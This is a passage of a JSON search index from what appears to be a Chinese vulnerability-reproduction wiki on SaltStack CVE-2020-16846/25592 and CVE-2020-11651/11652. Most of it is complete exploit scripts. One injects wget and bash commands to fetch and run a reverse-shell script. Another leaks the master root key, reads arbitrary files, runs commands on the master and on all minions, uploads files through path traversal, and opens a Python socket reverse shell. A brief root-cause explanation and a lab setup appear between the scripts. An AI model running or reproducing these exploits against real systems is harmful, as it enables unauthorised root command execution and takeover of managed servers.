\u53cd\u5f39shell","title":"!/bin/sh"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC\u76ee\u5f55\u4e2d peiqi.sh\u6587\u4ef6 \u9700\u8981\u66f4\u6539\u53cd\u5f39ip,port,\u5e76\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u8ba9\u76ee\u6807\u8fdb\u884c\u4e0b\u8f7d DNS\u6709\u54cd\u5e94\u5219\u4ee3\u8868\u53ef\u80fd\u6709\u6f0f\u6d1e\uff0c\u4fbf\u53ef\u4ee5\u8fdb\u884c\u53cd\u5f39shell import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: SaltStack Version < 2019.2.4 & < 3000.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mDnslog >>> xxx.dnslog.cn \\033 [0m' ) print ( '+ \\033 [36mFile_addr >>> http://xxx.xxx.xxx/cmd.sh \\033 [0m' ) print ( '+ \\033 [36mFile_name >>> cmd.sh \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , dnslog ): vuln_url = target_url + \"/run\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"DNT\" : \"1\" , \"Connection\" : \"close\" , \"Upgrade-Insecure-Requests\" : \"1\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"application/x-yaml\" , \"Accept-Language\" : \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget http:// {} \" . format ( dnslog ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 10 ) print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884c wget http:// {} \\033 [0m\" . format ( dnslog )) if \"return\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u8bf7\u67e5\u770b Dnslog\u54cd\u5e94 \\033 [0m\" ) while True : Chois = input ( \" \\033 [35m\u662f\u5426\u53cd\u5f39 Shell(Y/N) >>> \\033 [0m\" ) if Chois == \"Y\" or Chois == \"y\" : File_addr = input ( \" \\033 [35mFile_addr >>> \\033 [0m\" ) File_name = input ( \" \\033 [35mFile_name >>> \\033 [0m\" ) POC_2 ( target_url , File_addr , File_name ) else : sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , File_addr , File_name ): vuln_url = target_url + \"/run\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"DNT\" : \"1\" , \"Connection\" : \"close\" , \"Upgrade-Insecure-Requests\" : \"1\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"application/x-yaml\" , \"Accept-Language\" : \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget {} \" . format ( File_addr ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 10 ) print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884c wget {} \\033 [0m\" . format ( File_addr )) if \"return\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u4e0b\u8f7d {} \\033 [0m\" . format ( File_addr )) POC_3 ( target_url , File_name ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , File_name ): vuln_url = target_url + \"/run\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"DNT\" : \"1\" , \"Connection\" : \"close\" , \"Upgrade-Insecure-Requests\" : \"1\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"application/x-yaml\" , \"Accept-Language\" : \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|/bin/bash {} \" . format ( File_name ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 10 ) print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884c /bin/bash \\033 [0m\" . format ( File_name )) if \"return\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u547d\u4ee4\u6267\u884c\u5b8c\u6bd5\uff0c\u8bf7\u67e5\u770b\u662f\u5426\u53cd\u5f39Shell \\033 [0m\" . format ( File_name )) sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [32m[o] \u547d\u4ee4\u6267\u884c\u6210\u529f \\033 [0m\" ) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) dnslog = str ( input ( \" \\033 [35mDnslog >>> \\033 [0m\" )) POC_1 ( target_url , dnslog )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/#\u53c2\u8003\u6587\u7ae0","text":"https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/Saltstack%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-11651%2011652/","text":"Saltstack \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-11651/11652 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 SaltStack \u662f\u57fa\u4e8e Python \u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\u3002\u56fd\u5916\u67d0\u5b89\u5168\u56e2\u961f\u62ab\u9732\u4e86 SaltStack \u5b58\u5728\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2020-11651\uff09\u548c\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\uff08CVE-2020-11652\uff09\u3002 \u5728 CVE-2020-11651 \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u4ee5\u7ed5\u8fc7 Salt Master \u7684\u9a8c\u8bc1\u903b\u8f91\uff0c\u8c03\u7528\u76f8\u5173\u672a\u6388\u6743\u51fd\u6570\u529f\u80fd\uff0c\u4ece\u800c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002 \u5728 CVE-2020-11652 \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u4ee5\u8bfb\u53d6\u3001\u5199\u5165\u670d\u52a1\u5668\u4e0a\u4efb\u610f\u6587\u4ef6\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] SaltStack Version < 2019.2.4 SaltStack Version < 3000.2 \u73af\u5883\u642d\u5efa \u00b6 [!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-11652 docker-compose up -d \u6f0f\u6d1e\u590d\u73b0 \u00b6 salt-master\u666e\u904d\u4f7f\u7528\u8fd9\u4e24\u884c\u4ee3\u7801\u8fdb\u884c\u8ba4\u8bc1\uff0c\u5176\u4e2d clear_load \u662f\u53ef\u63a7\u8f93\u5165\u70b9\u3002 auth_type, err_name, key, sensitive_load_keys = self._prep_auth_info(clear_load) auth_check = self.loadauth.check_authentication(clear_load, auth_type, key=key) _prep_auth_info \u9996\u5148\u4f1a\u8bc6\u522b clear_load \u8f93\u5165\u7684\u5b57\u6bb5\u5e76\u9009\u7528\u5176\u4e2d\u4e4b\u4e00\u4f5c\u4e3a\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u7136\u540e\u4f20\u53c2\u5230 check_authentication \u65b9\u6cd5\u68c0\u9a8c\u8ba4\u8bc1\u662f\u5426\u6709\u6548\u3002 \u5728\u7b2c\u4e09\u79cd\u8ba4\u8bc1\u65b9\u5f0f auth_type=='user' \u4e2d\uff0c\u4f1a\u7531 _prep_auth_info \u83b7\u53d6\u5230\u7cfb\u7edfopt\u7684key\uff0c\u4f20\u9012\u5230 check_authentication \u4e2d\u548cAPI\u53c2\u6570\u4e2d\u643a\u5e26\u7684key\u8fdb\u884c == \u6bd4\u5bf9\u3002 \u7406\u8bba\u4e0a _prep_auth_info \u662f\u4e0d\u53ef\u88ab\u5916\u90e8\u8c03\u7528\u7684\uff0c\u6f0f\u6d1e\u6210\u56e0\u5373\u662f\u653b\u51fb\u8005\u901a\u8fc7\u533f\u540dAPI\u76f4\u63a5\u8c03\u7528 _prep_auth_info \u65b9\u6cd5\uff0c\u5728\u56de\u663e\u4e2d\u62ff\u5230 self.key \uff0c\u5e76\u5728\u540e\u7eed\u7684\u8bf7\u6c42\u4e2d\u4f7f\u7528\u83b7\u53d6\u5230\u7684key\u8fc7\u9a8c\u8bc1\uff0c\u4ee5root\u6743\u9650\u6267\u884c\u9ad8\u5371\u6307\u4ee4\u3002 Mworker daemon\u8fdb\u7a0b\u5904\u7406API\u8bf7\u6c42\uff1a class MWorker ( salt . utils . process . SignalHandlingProcess ): \"\"\" The worker multiprocess instance to manage the backend operations for the salt master. \"\"\" \u5176\u4e2d _handle_clear & _handle_aes \u51fd\u6570\u5206\u522b\u5904\u7406\u660e\u6587\u548c\u52a0\u5bc6\u6307\u4ee4\uff1a \u5728\u8fd9\u91cc\uff0c self._clear_funcs \u662f class ClearFuncs \u7684\u5b9e\u4f8b\uff0c\u5728\u8fd9\u91ccAPI\u8bbf\u95ee\u8005\u53ef\u4ee5\u65e0\u8ba4\u8bc1\u8c03\u7528\u4efb\u610f\u7684\u7c7b\u51fd\u6570\u3002 class ClearFuncs ( TransportMethods ): \"\"\" Set up functions that are safe to execute when commands sent to the master without encryption and authentication \"\"\" ClearFuncs._prep_auth_info() \u5c06self.key\u8fd4\u56de\u7ed9API\u9020\u6210\u6cc4\u9732\u3002\u653b\u51fb\u8005\u53ef\u5148\u901a\u8fc7\u8fd9\u4e00\u65b9\u6cd5\u62ff\u5230key\uff0c\u7136\u540e\u901a\u8fc7\u8ba4\u8bc1\u63a5\u53e3\u4e0b\u53d1shell\u6307\u4ee4\u3002 \u4e4b\u524d\u5b58\u5728\u6f0f\u6d1e\u7684\u4ee3\u7801\u4e2d\u4ec5\u8fc7\u6ee4\u6389 __ \u5f00\u5934\u7684private\u65b9\u6cd5\uff0c\u5bfc\u81f4 _prep_auth_info \u6cc4\u9732\uff0cpatch\u4e2d\u5bf9clearfuncs\u548caesfuncs\u4e24\u4e2a\u7c7b\u6dfb\u52a0\u4e86expose\u767d\u540d\u5355\u8fc7\u6ee4\uff1a \u8fd9\u91cc\u4f7f\u7528 POC \u6765\u590d\u7ebf \u4e0b\u8f7d\u5730\u5740: https://github.com/jasperla/CVE-2020-11651-poc \u8bfb\u53d6\u6587\u4ef6 /etc/passwd \u53cd\u5f39shell\uff08\u8fd9\u91cc\u4f7f\u7528\u53e6\u4e00\u4e2aPOC\uff09 \u4e0b\u8f7d\u5730\u5740: https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py \u6f0f\u6d1e\u5229\u7528POC \u00b6 \u4e0b\u8f7d\u5730\u5740 # BASE https://github.com/bravery9/SaltStack-Exp # \u5fae\u4fe1\u516c\u4f17\u53f7\uff1a\u53f0\u4e0b\u8a00\u4e66 # -*- coding:utf-8 -*- - from __future__ import absolute_import , print_function , unicode_literals import argparse import os import sys import datetime import salt import salt.version import salt.transport.client import salt.exceptions DEBUG = False def init_minion ( master_ip , master_port ): minion_config = { 'transport' : 'zeromq' , 'pki_dir' : '/tmp' , 'id' : 'root' , 'log_level' : 'debug' , 'master_ip' : master_ip , 'master_port' : master_port , 'auth_timeout' : 5 , 'auth_tries' : 1 , 'master_uri' : 'tcp:// {0} : {1} ' . format ( master_ip , master_port ) } return salt . transport . client . ReqChannel . factory ( minion_config , crypt = 'clear' ) def check_salt_version (): print ( \"[+] Salt \u7248\u672c: {} \" . format ( salt . version . __version__ )) vi = salt . version . __version_info__ if ( vi < ( 2019 , 2 , 4 ) or ( 3000 ,) <= vi < ( 3000 , 2 )): return True else : return False def check_connection ( master_ip , master_port , channel ): print ( \"[+] Checking salt-master ( {} : {} ) status... \" . format ( master_ip , master_port ), end = '' ) sys . stdout . flush () try : channel . send ({ 'cmd' : 'ping' }, timeout = 2 ) print ( ' \\033 [1;32m\u53ef\u4ee5\u8fde\u63a5 \\033 [0m' ) except salt . exceptions . SaltReqTimeoutError : print ( \" \\033 [1;31m\u65e0\u6cd5\u8fde\u63a5 \\033 [0m\" ) sys . exit ( 1 ) def check_CVE_2020_11651 ( channel ): sys . stdout . flush () # try to evil try : rets = channel . send ({ 'cmd' : '_prep_auth_info' }, timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \" \\033 [1;32m\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) except : print ( \" \\033 [1;32m\u672a\u77e5\u9519\u8bef \\033 [0m\" ) raise else : pass finally : if rets : root_key = rets [ 2 ][ 'root' ] print ( \" \\033 [1;31m\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) return root_key return None def pwn_read_file ( channel , root_key , path , master_ip ): # print(\"[+] Attemping to read {} from {}\".format(path, master_ip)) sys . stdout . flush () msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.read' , 'path' : path , 'saltenv' : 'base' , } rets = channel . send ( msg , timeout = 3 ) print ( rets [ 'data' ][ 'return' ][ 0 ][ path ]) def pwn_getshell ( channel , root_key , LHOST , LPORT ): msg = { \"key\" : root_key , \"cmd\" : \"runner\" , 'fun' : 'salt.cmd' , \"kwarg\" : { \"fun\" : \"cmd.exec_code\" , \"lang\" : \"python3\" , \"code\" : \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( \\\" {} \\\" , {} ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ \\\" /bin/bash \\\" , \\\" -i \\\" ]);\" . format ( LHOST , LPORT ) }, 'jid' : '20200504042611133934' , 'user' : 'sudo_user' , '_stamp' : '2020-05-04T04:26:13.609688' } try : response = channel . send ( msg , timeout = 3 ) print ( \"Got response for attempting master shell: \" + str ( response ) + \". Looks promising!\" ) return True except : print ( \"something failed\" ) return False def pwn_exec ( channel , root_key , exec_cmd , master_or_minions ): if master_or_minions == \"master\" : msg = { \"key\" : root_key , \"cmd\" : \"runner\" , 'fun' : 'salt.cmd' , \"kwarg\" : { \"fun\" : \"cmd.exec_code\" , \"lang\" : \"python3\" , \"code\" : \"import subprocess;subprocess.call(' {} ',shell=True)\" . format ( exec_cmd ) }, 'jid' : '20200504042611133934' , 'user' : 'sudo_user' , '_stamp' : '2020-05-04T04:26:13.609688' } try : response = channel . send ( msg , timeout = 3 ) print ( \"Got response for attempting master shell: \" + str ( response ) + \". Looks promising!\" ) return True except : print ( \"something failed\" ) return False if master_or_minions == \"minions\" : print ( \"Sending command to all minions on master\" ) jid = \"{0:%Y%m %d %H%M%S %f }\" . format ( datetime . datetime . utcnow ()) cmd = \"/bin/sh -c ' {0} '\" . format ( exec_cmd ) msg = { 'cmd' : \"_send_pub\" , \"fun\" : \"cmd.run\" , \"arg\" : [ cmd ], \"tgt\" : \"*\" , \"ret\" : \"\" , \"tgt_type\" : \"glob\" , \"user\" : \"root\" , \"jid\" : jid } try : response = channel . send ( msg , timeout = 3 ) if response == None : return True else : return False except : return False ##################################### master_ip = input ( '\u76ee\u6807IP\uff1a' ) master_port = '4506' channel = init_minion ( master_ip , master_port ) try : root_key = check_CVE_2020_11651 ( channel ) except : pass while master_ip != '' : print ( '1.\u6d4b\u8bd5POC 2.\u8bfb\u53d6\u6587\u4ef6 3.\u6267\u884c\u547d\u4ee4(\u65e0\u56de\u663e) 4.\u53cd\u5f39shell 5.\u9000\u51fa' ) whattype = input ( '\u8bf7\u9009\u62e9\uff1a' ) if whattype == '1' : check_salt_version () # \u68c0\u67e5salt\u7248\u672c check_connection ( master_ip , master_port , channel ) # \u68c0\u67e5\u8fde\u63a5 root_key = check_CVE_2020_11651 ( channel ) # \u8bfb\u53d6root key print ( root_key ) elif whattype == '2' : path = input ( '\u8bfb\u53d6\u8def\u5f84\uff1a' ) try : pwn_read_file ( channel , root_key , path , master_ip ) # \u8bfb\u53d6\u6587\u4ef6 except : print ( '\u6587\u4ef6\u4e0d\u5b58\u5728' ) elif whattype == '3' : print ( '1.master 2.minions' ) exectype = input ( '\u9009\u62e9\u65b9\u5f0f\uff1a' ) if exectype == '1' : master_or_minions = 'master' elif exectype == '2' : master_or_minions = 'minions' exec_cmd = input ( '\u8f93\u5165\u547d\u4ee4\uff1a' ) pwn_exec ( channel , root_key , exec_cmd , master_or_minions ) # \u6267\u884c\u547d\u4ee4 elif whattype == '4' : LHOST = input ( '\u53cd\u5f39\u5230IP\uff1a' ) LPORT = input ( '\u53cd\u5f39\u7aef\u53e3\uff1a' ) pwn_getshell ( channel , root_key , LHOST , LPORT ) # \u53cd\u5f39shell elif whattype == '5' : exit () \u4e0b\u8f7d\u5730\u5740 #!/usr/bin/env python # # Exploit for CVE-2020-11651 and CVE-2020-11652 # Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc) # This exploit is based on this checker script: # https://github.com/rossengeorgiev/salt-security-backports from __future__ import absolute_import , print_function , unicode_literals import argparse import datetime import os import os.path import sys import time import salt import salt.version import salt.transport.client import salt.exceptions def init_minion ( master_ip , master_port ): minion_config = { 'transport' : 'zeromq' , 'pki_dir' : '/tmp' , 'id' : 'root' , 'log_level' : 'debug' , 'master_ip' : master_ip , 'master_port' : master_port , 'auth_timeout' : 5 , 'auth_tries' : 1 , 'master_uri' : 'tcp:// {0} : {1} ' . format ( master_ip , master_port ) } return salt . transport . client . ReqChannel . factory ( minion_config , crypt = 'clear' ) # --- check funcs ---- def check_connection ( master_ip , master_port , channel ): print ( \"[+] Checking salt-master ( {} : {} ) status... \" . format ( master_ip , master_port ), end = '' ) sys . stdout . flush () # connection check try : channel . send ({ 'cmd' : 'ping' }, timeout = 2 ) except salt . exceptions . SaltReqTimeoutError : print ( \"OFFLINE\" ) sys . exit ( 1 ) else : print ( \"ONLINE\" ) def check_CVE_2020_11651 ( channel ): print ( \"[+] Checking if vulnerable to CVE-2020-11651... \" , end = '' ) sys . stdout . flush () try : rets = channel . send ({ 'cmd' : '_prep_auth_info' }, timeout = 3 ) except : print ( 'ERROR' ) return None else : pass finally : if rets : print ( 'YES' ) root_key = rets [ 2 ][ 'root' ] return root_key print ( 'NO' ) return None def check_CVE_2020_11652_read_token ( debug , channel , top_secret_file_path ): print ( \"[+] Checking if vulnerable to CVE-2020-11652 (read_token)... \" , end = '' ) sys . stdout . flush () # try read file msg = { 'cmd' : 'get_token' , 'arg' : [], 'token' : top_secret_file_path , } try : rets = channel . send ( msg , timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \"YES\" ) except : print ( \"ERROR\" ) raise else : if debug : print () print ( rets ) print ( \"NO\" ) def check_CVE_2020_11652_read ( debug , channel , top_secret_file_path , root_key ): print ( \"[+] Checking if vulnerable to CVE-2020-11652 (read)... \" , end = '' ) sys . stdout . flush () # try read file msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.read' , 'path' : top_secret_file_path , 'saltenv' : 'base' , } try : rets = channel . send ( msg , timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \"TIMEOUT\" ) except : print ( \"ERROR\" ) raise else : if debug : print () print ( rets ) if rets [ 'data' ][ 'return' ]: print ( \"YES\" ) else : print ( \"NO\" ) def check_CVE_2020_11652_write1 ( debug , channel , root_key ): print ( \"[+] Checking if vulnerable to CVE-2020-11652 (write1)... \" , end = '' ) sys . stdout . flush () # try read file msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.write' , 'path' : '../../../../../../../../tmp/salt_CVE_2020_11652' , 'data' : 'evil' , 'saltenv' : 'base' , } try : rets = channel . send ( msg , timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \"TIMEOUT\" ) except : print ( \"ERROR\" ) raise else : if debug : print () print ( rets ) pp ( rets ) if rets [ 'data' ][ 'return' ] . startswith ( 'Wrote' ): try : os . remove ( '/tmp/salt_CVE_2020_11652' ) except OSError : print ( \"Maybe?\" ) else : print ( \"YES\" ) else : print ( \"NO\" ) def check_CVE_2020_11652_write2 ( debug , channel , root_key ): print ( \"[+] Checking if vulnerable to CVE-2020-11652 (write2)... \" , end = '' ) sys . stdout . flush () # try read file msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'config.update_config' , 'file_name' : '../../../../../../../../tmp/salt_CVE_2020_11652' , 'yaml_contents' : 'evil' , 'saltenv' : 'base' , } try : rets = channel . send ( msg , timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \"TIMEOUT\" ) except : print ( \"ERROR\" ) raise else : if debug : print () print ( rets ) if rets [ 'data' ][ 'return' ] . startswith ( 'Wrote' ): try : os . remove ( '/tmp/salt_CVE_2020_11652.conf' ) except OSError : print ( \"Maybe?\" ) else : print ( \"YES\" ) else : print ( \"NO\" ) def pwn_read_file ( channel , root_key , path , master_ip ): print ( \"[+] Attemping to read {} from {} \" . format ( path , master_ip )) sys . stdout . flush () msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.read' , 'path' : path , 'saltenv' : 'base' , } rets = channel . send ( msg , timeout = 3 ) print ( rets [ 'data' ][ 'return' ][ 0 ][ path ]) def pwn_upload_file ( channel , root_key , src , dest , master_ip ): print ( \"[+] Attemping to upload {} to {} on {} \" . format ( src , dest , master_ip )) sys . stdout . flush () try : fh = open ( src , 'rb' ) payload = fh . read () fh . close () except Exception as e : print ( '[-] Failed to read {} : {} ' . format ( src , e )) return msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.write' , 'saltenv' : 'base' , 'data' : payload , 'path' : dest , } rets = channel . send ( msg , timeout = 3 ) print ( '[ ] {} ' . format ( rets [ 'data' ][ 'return' ])) def pwn_exec ( channel , root_key , cmd , master_ip , jid ): print ( \"[+] Attemping to execute {} on {} \" . format ( cmd , master_ip )) sys . stdout . flush () msg = { 'key' : root_key , 'cmd' : 'runner' , 'fun' : 'salt.cmd' , 'saltenv' : 'base' , 'user' : 'sudo_user' , 'kwarg' : { 'fun' : 'cmd.exec_code' , 'lang' : 'python' , 'code' : \"import subprocess;subprocess.call(' {} ',shell=True)\" . format ( cmd ) }, 'jid' : jid , } try : rets = channel . send ( msg , timeout = 3 ) except Exception as e : print ( '[-] Failed to submit job' ) return if rets . get ( 'jid' ): print ( '[+] Successfully scheduled job: {} ' . format ( rets [ 'jid' ])) def pwn_exec_all ( channel , root_key , cmd , master_ip , jid ): print ( \"[+] Attemping to execute ' {} ' on all minions connected to {} \" . format ( cmd , master_ip )) sys . stdout . flush () msg = { 'key' : root_key , 'cmd' : '_send_pub' , 'fun' : 'cmd.run' , 'user' : 'root' , 'arg' : [ \"/bin/sh -c ' {} '\" . format ( cmd ) ], 'tgt' : '*' , 'tgt_type' : 'glob' , 'ret' : '' , 'jid' : jid } try : rets = channel . send ( msg , timeout = 3 ) except Exception as e : print ( '[-] Failed to submit job' ) return finally : if rets == None : print ( '[+] Successfully submitted job to all minions.' ) else : print ( '[-] Failed to submit job' ) def main (): parser = argparse . ArgumentParser ( description = 'Saltstack exploit for CVE-2020-11651 and CVE-2020-11652' ) parser . add_argument ( '--master' , '-m' , dest = 'master_ip' , default = '127.0.0.1' ) parser . add_argument ( '--port' , '-p' , dest = 'master_port' , default = '4506' ) parser . add_argument ( '--force' , '-f' , dest = 'force' , default = False , action = 'store_false' ) parser . add_argument ( '--debug' , '-d' , dest = 'debug' , default = False , action = 'store_true' ) parser . add_argument ( '--run-checks' , '-c' , dest = 'run_checks' , default = False , action = 'store_true' ) parser . add_argument ( '--read' , '-r' , dest = 'read_file' ) parser . add_argument ( '--upload-src' , dest = 'upload_src' ) parser . add_argument ( '--upload-dest' , dest = 'upload_dest' ) parser . add_argument ( '--exec' , dest = 'exec' , help = 'Run a command on the master' ) parser . add_argument ( '--exec-all' , dest = 'exec_all' , help = 'Run a command on all minions' ) args = parser . parse_args () print ( \"[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.\" ) time . sleep ( 1 ) # Both src and destination are required for uploads if ( args . upload_src and args . upload_dest is None ) or ( args . upload_dest and args . upload_src is None ): print ( '[-] Must provide both --upload-src and --upload-dest' ) sys . exit ( 1 ) channel = init_minion ( args . master_ip , args . master_port ) check_connection ( args . master_ip , args . master_port , channel ) root_key = check_CVE_2020_11651 ( channel ) if root_key : print ( '[*] root key obtained: {} ' . format ( root_key )) else : print ( '[-] Failed to find root key...aborting' ) sys . exit ( 127 ) if args . run_checks : # Assuming this check runs on the master itself, create a file with \"secret\" content # and abuse CVE-2020-11652 to read it. top_secret_file_path = '/tmp/salt_cve_teta' with salt . utils . fopen ( top_secret_file_path , 'w' ) as fd : fd . write ( \"top secret\" ) # Again, this assumes we're running this check on the master itself with salt . utils . fopen ( '/var/cache/salt/master/.root_key' ) as keyfd : root_key = keyfd . read () check_CVE_2020_11652_read_token ( debug , channel , top_secret_file_path ) check_CVE_2020_11652_read ( debug , channel , top_secret_file_path , root_key ) check_CVE_2020_11652_write1 ( debug , channel , root_key ) check_CVE_2020_11652_write2 ( debug , channel , root_key ) os . remove ( top_secret_file_path ) sys . exit ( 0 ) if args . read_file : pwn_read_file ( channel , root_key , args . read_file , args . master_ip ) if args . upload_src : if os . path . isabs ( args . upload_dest ): print ( '[-] Destination path must be relative; aborting' ) sys . exit ( 1 ) pwn_upload_file ( channel , root_key , args . upload_src , args . upload_dest , args . master_ip ) jid = '{0:%Y%m %d %H%M%S %f }' . format ( datetime . datetime . utcnow ()) if args . exec : pwn_exec ( channel , root_key , args . exec , args . master_ip , jid ) if args . exec_all : print ( \"[!] Lester, is this what you want? Hit ^C to abort.\" ) time . sleep ( 2 ) pwn_exec_all ( channel , root_key , args . exec_all , args . master_ip , jid ) if __name__ == '__main__' : main () \u53c2\u8003\u6587\u7ae0 \u00b6 https://www.cdxy.me/?p=822","title":"Saltstack \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-11651 